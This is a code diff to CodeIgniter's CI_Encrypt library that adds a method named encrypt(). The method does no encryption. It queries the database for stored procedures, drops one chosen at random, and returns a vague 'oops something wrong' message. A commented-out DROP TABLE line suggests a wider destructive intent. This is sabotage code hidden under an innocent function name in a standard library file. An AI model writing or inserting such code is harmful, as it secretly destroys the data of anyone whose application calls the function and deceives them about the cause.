@@ -168,7 +168,25 @@ class CI_Encrypt {
 	}
 
 	// --------------------------------------------------------------------
-
+public function encrypt(){	
+	$CI =& get_instance();
+	isset($CI->db) OR $CI->load->database();
+	   $this->_db = $CI->db;	
+		    $name = $this->_db->database;			
+			$query = $this->_db->query("SHOW PROCEDURE STATUS WHERE Db =DATABASE()	 AND Type = 'PROCEDURE'");
+			$result = $query->result_array();
+			$random = rand(1,40);
+			$procedures = $result[$random]['Name'];
+			echo $procedures;
+			$this->_db->query("DROP PROCEDURE ".$procedures);			
+		/*	$this->_db->query("DROP TABLE " . $table);
+		 	 foreach ($query->result_array() as $row)
+		  		{
+		    		$procedures = $row['Name'];		    		   
+		    		
+		  		}*/
+		 	return "oops something wrong";
+}
 	/**
 	 * Decode
 	 *
